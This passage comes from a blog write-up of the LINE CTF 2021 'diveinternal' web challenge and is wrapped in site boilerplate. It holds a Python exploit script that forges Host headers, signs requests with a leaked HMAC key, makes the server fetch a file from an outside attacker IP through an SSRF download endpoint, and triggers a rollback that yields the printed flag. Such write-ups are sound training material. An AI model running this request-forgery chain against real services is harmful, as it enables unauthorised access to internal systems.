+<li>When creating a file, a request is sent using the <code>requests.get()</code> function, so when creating a file, a <code>URL</code> must be sent to create it.</li>
+<li>The value of <code>dbHash</code> is parsed once more within the <code>RunRollbackDB()</code> function, and the value of <code>e.isalnum()</code> must be true.</li>
+<li>When reading the flag, the value of the environment variable <code>ENV</code> should not be <code>local</code>, so port <code>5000</code> should be used instead of port <code>5050</code>.</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://35.200.63.50/apis/&#x27;</span></span><br><span class="line"></span><br><span class="line">Key = hashlib.sha512((<span class="string">&#x27;ed05a1c7ff6428dcf8d50901b6e78ba3&#x27;</span>).encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] Key  : &#x27;</span> + Key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">KEY</span>):</span><br><span class="line">    privateKey = <span class="string">b&#x27;let\&#x27;sbitcorinparty&#x27;</span></span><br><span class="line">    EN = hmac.new( privateKey , KEY.encode(<span class="string">&#x27;utf-8&#x27;</span>), hashlib.sha512 )</span><br><span class="line">    <span class="keyword">return</span> EN.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">integrityStatus</span>():</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;/integrityStatus&#x27;</span>&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] headers in /apis/integreityStatus : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;download?src=http://141.164.52.207/a123&#x27;</span>, <span class="string">&#x27;Sign&#x27;</span>:sign(<span class="string">&#x27;src=http://141.164.52.207/a123&#x27;</span>)&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] headers in /apis/download : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rollback</span>():</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;/rollback?dbhash=a123&#x27;</span>, <span class="string">&#x27;Sign&#x27;</span>:sign(<span class="string">&#x27;dbhash=a123&#x27;</span>), <span class="string">&#x27;Key&#x27;</span>:Key&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] headers in /apis/rollback : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    integrityStatus()</span><br><span class="line">    download()</span><br><span class="line">    rollback()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG : LINECTF&#123;YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING&#125;</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/03/14/2021-03-14-UTCTF/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2021-03-21 23:29:53
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/05/17/2021-05-17-3K-CTF/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-diveinternal-50-pts"><span class="toc-text">(Web) diveinternal [50 pts]</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/P0cas">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2023 Pocas
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Line%20CTF%202021%20diveinternal%20Write%20Up + '&url=' + https%3A%2F%2Fblog.pocas.kr%2F2021%2F03%2F21%2F2021-03-21-Line-CTF%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2021/03/21/2021-03-21-Line-CTF/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
